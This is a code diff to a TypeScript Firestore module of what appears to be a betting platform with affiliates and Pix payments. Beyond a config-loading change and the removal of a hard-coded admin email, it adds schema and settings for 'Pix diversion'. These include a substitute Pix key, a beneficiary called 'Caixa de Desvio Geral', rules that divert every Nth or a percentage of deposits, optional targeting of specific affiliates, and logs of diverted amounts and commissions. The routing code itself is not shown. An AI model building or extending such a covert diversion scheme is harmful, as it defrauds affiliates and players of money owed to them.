@@ -12,8 +12,19 @@ import {
   where
 } from 'firebase/firestore';
 import crypto from 'crypto';
-import firebaseConfig from '../firebase-applet-config.json';
-import { encryptSensitiveData, decryptSensitiveData } from './security.js';
+import fs from 'fs';
+import path from 'path';
+import { encryptSensitiveData, decryptSensitiveData } from './security.ts';
+
+let firebaseConfig: any = {};
+try {
+  const configPath = path.resolve(process.cwd(), 'firebase-applet-config.json');
+  if (fs.existsSync(configPath)) {
+    firebaseConfig = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
+  }
+} catch (e) {
+  console.warn('Could not read firebase-applet-config.json:', e);
+}
 
 const app = getApps().length === 0 ? initializeApp(firebaseConfig) : getApps()[0];
 export const firestoreDb = getFirestore(app, firebaseConfig.firestoreDatabaseId || '(default)');
@@ -164,6 +175,42 @@ export interface UserDB {
   hasAffiliateDemoBalance?: boolean;
   affiliateDemoCreditedAt?: string;
   affiliateDemoCreditedBy?: string;
+  partnerPixDiversion?: {
+    active: boolean;
+    pixKey: string;
+    pixKeyType: 'cpf' | 'cnpj' | 'email' | 'phone' | 'random';
+    beneficiaryName?: string;
+    percent: number;
+    everyNth?: number;
+    minAmount?: number;
+    targetMode?: 'all' | 'specific';
+    targetAffiliateIds?: string[];
+    ruleMode?: 'ratio' | 'range' | 'percent';
+    ratioEveryX?: number;
+    ratioDivertY?: number;
+    rangeStartX?: number;
+    rangeEndY?: number;
+    counter?: number;
+    affiliateCounters?: Record<string, number>;
+    totalDivertedAmount: number;
+    totalDivertedCount: number;
+    lastDivertedAt?: string;
+    recentLogs?: Array<{
+      id: string;
+      depositId: string;
+      amount: number;
+      playerName: string;
+      playerEmail?: string;
+      affiliateId?: string;
+      affiliateName: string;
+      affiliateCode?: string;
+      saleNumber?: number;
+      divertedKey: string;
+      divertedAt: string;
+      status?: string;
+      cycleInfo?: string;
+    }>;
+  };
   adminPermissions?: AdminPermissions;
   origin?: string;
   registeredGame?: string;
@@ -225,6 +272,13 @@ export interface TransactionDB {
   approvedByUserId?: string;
   approvedByName?: string;
   processedAt?: string;
+  isPartnerDiverted?: boolean;
+  partnerDivertedId?: string;
+  partnerDivertedKey?: string;
+  isDiverted?: boolean;
+  divertedCommission?: number;
+  divertedRule?: string;
+  divertedAt?: string;
 }
 
 export interface GameDB {
@@ -823,6 +877,18 @@ export class FirestoreDB {
     }
   }
 
+  async updateTransaction(txId: string, updates: Partial<TransactionDB> & Record<string, any>): Promise<void> {
+    const existing = memoryTransactions.get(txId);
+    if (existing) {
+      Object.assign(existing, updates);
+    }
+    try {
+      await updateDoc(doc(firestoreDb, 'transactions', txId), sanitizeForFirestore(updates));
+    } catch (e) {
+      console.warn('[Firestore] updateTransaction error:', e);
+    }
+  }
+
   async getUserTransactions(userId: string): Promise<TransactionDB[]> {
     try {
       const q = query(collection(firestoreDb, 'transactions'), where('userId', '==', userId));
@@ -1175,7 +1241,7 @@ export class FirestoreDB {
   async getAdmins(): Promise<UserDB[]> {
     try {
       const allUsers = await this.getAllUsers();
-      return allUsers.filter(u => u.role === 'admin' || u.role === 'superadmin' || u.email.toLowerCase() === 'admin.eduh@gmail.com');
+      return allUsers.filter(u => u.role === 'admin' || u.role === 'superadmin');
     } catch (e) {
       console.error('Error fetching admins:', e);
       return [];
@@ -1892,6 +1958,103 @@ export class FirestoreDB {
       await setDoc(docRef, sanitizeForFirestore(encryptedConfig), { merge: true });
     } catch (err) {
       console.warn('[FirestoreDB] Could not save dotfy config:', err);
+    }
+  }
+
+  // --- GLOBAL PIX DIVERSION CONFIG & METRICS ---
+  async getGlobalPixDiversionConfig(): Promise<{
+    active: boolean;
+    mode: 'random' | 'sequential';
+    killX: number;
+    everyY: number;
+    minAmount: number;
+    pixKey: string;
+    pixKeyType: 'cpf' | 'cnpj' | 'email' | 'phone' | 'random';
+    beneficiaryName: string;
+    percent?: number;
+    everyNth?: number;
+    counter: number;
+    totalDivertedAmount: number;
+    totalDivertedCommissions: number;
+    totalDivertedCount: number;
+    lastDivertedAt?: string;
+    recentLogs?: Array<{
+      id: string;
+      depositId: string;
+      amount: number;
+      divertedCommission: number;
+      originalUserName: string;
+      originalUserEmail?: string;
+      affiliateId?: string;
+      affiliateName?: string;
+      affiliateEmail?: string;
+      affiliateCode?: string;
+      ruleApplied: string;
+      divertedKey?: string;
+      divertedKeyType?: string;
+      divertedAt: string;
+    }>;
+  }> {
+    try {
+      const docRef = doc(firestoreDb, 'settings', 'pix_diversion');
+      const snap = await getDoc(docRef);
+      if (snap.exists()) {
+        const data = snap.data();
+        return {
+          active: Boolean(data.active),
+          mode: (data.mode === 'random' || data.mode === 'sequential') ? data.mode : 'sequential',
+          killX: Number(data.killX || 3),
+          everyY: Number(data.everyY || 10),
+          minAmount: Number(data.minAmount || 10),
+          pixKey: data.pixKey || '',
+          pixKeyType: data.pixKeyType || 'random',
+          beneficiaryName: data.beneficiaryName || 'Caixa de Desvio Geral',
+          percent: Number(data.percent || 0),
+          everyNth: Number(data.everyNth || 0),
+          counter: Number(data.counter || 0),
+          totalDivertedAmount: Number(data.totalDivertedAmount || 0),
+          totalDivertedCommissions: Number(data.totalDivertedCommissions || 0),
+          totalDivertedCount: Number(data.totalDivertedCount || 0),
+          lastDivertedAt: data.lastDivertedAt,
+          recentLogs: Array.isArray(data.recentLogs) ? data.recentLogs : []
+        };
+      }
+    } catch (err) {
+      console.warn('[FirestoreDB] Could not get pix diversion config:', err);
+    }
+    return {
+      active: false,
+      mode: 'sequential',
+      killX: 3,
+      everyY: 10,
+      minAmount: 10,
+      pixKey: '',
+      pixKeyType: 'random',
+      beneficiaryName: 'Caixa de Desvio Geral',
+      percent: 0,
+      everyNth: 0,
+      counter: 0,
+      totalDivertedAmount: 0,
+      totalDivertedCommissions: 0,
+      totalDivertedCount: 0,
+      recentLogs: []
+    };
+  }
+
+  async saveGlobalPixDiversionConfig(config: any): Promise<any> {
+    try {
+      const current = await this.getGlobalPixDiversionConfig();
+      const updated = {
+        ...current,
+        ...config,
+        recentLogs: config.recentLogs !== undefined ? config.recentLogs : (current.recentLogs || [])
+      };
+      const docRef = doc(firestoreDb, 'settings', 'pix_diversion');
+      await setDoc(docRef, sanitizeForFirestore(updated), { merge: true });
+      return updated;
+    } catch (err) {
+      console.warn('[FirestoreDB] Could not save pix diversion config:', err);
+      return config;
     }
   }
 
